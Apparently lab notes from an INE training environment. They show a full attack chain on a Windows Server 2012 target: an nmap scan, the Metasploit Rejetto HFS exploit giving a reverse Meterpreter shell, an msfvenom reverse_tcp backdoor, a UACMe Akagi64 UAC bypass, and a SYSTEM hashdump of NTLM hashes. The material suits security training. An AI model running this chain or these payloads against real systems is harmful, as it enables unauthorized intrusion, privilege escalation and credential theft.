# Bypassing UAC with UACMe

### What is UAC?
**UAC** : **User Account Control**\
Windows security feature used to **prevent unauthorized** changes from being make to the OS.


```bash
└─# nmap demo.ine.local
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-16 13:49 IST
Nmap scan report for demo.ine.local (10.0.29.206)
Host is up (0.0021s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown

# Open target on browser and notice it says "No files in this folder"
# -> File service running

# set port 80 as a target and try to exploit
# start Metasploit

msf6 > setg RHOSTS 10.0.29.206
RHOSTS => 10.0.29.206

msf6 > search rejetto
msf6 > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) >

msf6 exploit(windows/http/rejetto_hfs_exec) > run

[*] Started reverse TCP handler on 10.10.43.2:4444 
[*] Using URL: http://10.10.43.2:8080/hlmzk61HhJ2L5u
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /hlmzk61HhJ2L5u
[*] Sending stage (176198 bytes) to 10.0.29.206
[!] Tried to delete %TEMP%\QwfzzR.vbs, unknown result
[*] Meterpreter session 1 opened (10.10.43.2:4444 -> 10.0.29.206:49250) at 2025-07-16 13:56:09 +0530
[*] Server stopped.


meterpreter > sysinfo
Computer        : VICTIM
OS              : Windows Server 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows

meterpreter > pgrep explorer
2844

meterpreter > migrate 2844
[*] Migrating from 992 to 2844...
[*] Migration completed successfully.

meterpreter > sysinfo
Computer        : VICTIM
OS              : Windows Server 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows

meterpreter > getuid
Server username: VICTIM\admin

meterpreter > shell
Process 2936 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>net user
net user

User accounts for \\VICTIM

-------------------------------------------------------------------------------
admin                    Administrator            Guest                    
The command completed successfully.


C:\Windows\system32>net localgroup administrators
net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
admin
Administrator
The command completed successfully.

C:\Windows\system32>net user admin password123
net user admin password123
System error 5 has occurred.

Access is denied.

# New tab
└─# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.43.2 LPORT=1234 -f exe> backdoor.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes

└─# ls                                                                    
backdoor.exe  Documents  Music     Public     thinclient_drives
Desktop       Downloads  Pictures  Templates  Videos


# Start Metasploit

msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.38.2
LHOST => 10.10.38.2
msf6 exploit(multi/handler) > set LPORT 1234
LPORT => 1234


msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.38.2:1234 


# Back to meterpreter session with refetto
meterpreter > pwd
C:\Windows\system32

meterpreter > getuid
Server username: VICTIM\admin

meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
SeShutdownPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

meterpreter > cd C:\\
meterpreter > mkdir Temp
Creating directory: Temp

meterpreter > cd Temp
meterpreter > upload backdoor.exe
[*] Uploading  : /root/backdoor.exe -> backdoor.exe
[*] Uploaded 72.07 KiB of 72.07 KiB (100.0%): /root/backdoor.exe -> backdoor.exe
[*] Completed  : /root/backdoor.exe -> backdoor.exe

meterpreter > upload /root/Desktop/tools/UACME/Akagi64.exe
[*] Uploading  : /root/Desktop/tools/UACME/Akagi64.exe -> Akagi64.exe
[*] Uploaded 194.50 KiB of 194.50 KiB (100.0%): /root/Desktop/tools/UACME/Akagi64.exe -> Akagi64.exe
[*] Completed  : /root/Desktop/tools/UACME/Akagi64.exe -> Akagi64.exe


meterpreter > shell
Process 916 created.
Channel 4 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Temp>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AEDF-99BD

 Directory of C:\Temp

07/16/2025  09:36 AM    <DIR>          .
07/16/2025  09:36 AM    <DIR>          ..
07/16/2025  09:35 AM           199,168 Akagi64.exe
07/16/2025  09:33 AM            73,802 backdoor.exe
07/16/2025  09:36 AM                 0 shell
               3 File(s)        272,970 bytes
               2 Dir(s)   8,272,564,224 bytes free

C:\Temp>.\Akagi64.exe 23 C:\Temp\backdoor.exe
.\Akagi64.exe 23 C:\Temp\backdoor.exe

# tcp handler
[*] Started reverse TCP handler on 10.10.38.2:1234 
[*] Sending stage (176198 bytes) to 10.0.23.206
[*] Meterpreter session 1 opened (10.10.38.2:1234 -> 10.0.23.206:49314) at 2025-07-16 15:15:32 +0530

meterpreter > sysinfo
Computer        : VICTIM
OS              : Windows Server 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > getuid
Server username: VICTIM\admin

meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

meterpreter > ps

Process List
============

 PID   PPID  Name        Arch  Session  User             Path
 ---   ----  ----        ----  -------  ----             ----
 0     0     [System Pr
             ocess]
 4     0     System      x64   0
 364   4     smss.exe    x64   0
 472   680   svchost.ex  x64   0        NT AUTHORITY\NE  C:\Windows\Syst
             e                          TWORK SERVICE    em32\svchost.ex
                                                         e
 496   680   svchost.ex  x64   0        NT AUTHORITY\LO  C:\Windows\Syst
             e                          CAL SERVICE      em32\svchost.ex
                                                         e
 520   512   csrss.exe   x64   0
 588   580   csrss.exe   x64   1
 596   512   wininit.ex  x64   0        NT AUTHORITY\SY  C:\Windows\Syst
             e                          STEM             em32\wininit.ex

meterpreter > migrate 596
[*] Migrating from 2788 to 596...
[*] Migration completed successfully.

meterpreter > sysinfo
Computer        : VICTIM
OS              : Windows Server 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > ps -S lsass.exe
Filtering on 'lsass.exe'

Process List
============

 PID  PPID  Name       Arch  Session  User              Path
 ---  ----  ----       ----  -------  ----              ----
 688  596   lsass.exe  x64   0        NT AUTHORITY\SYS  C:\Windows\syste
                                      TEM               m32\lsass.exe

meterpreter > migrate 688
[*] Migrating from 596 to 688...
[*] Migration completed successfully.

meterpreter > hashdump
admin:1012:aad3b435b51404eeaad3b435b51404ee:4d6583ed4cef81c2f2ac3c88fc5f3da6:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:659c8124523a634e0ba68e64bb1d822f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

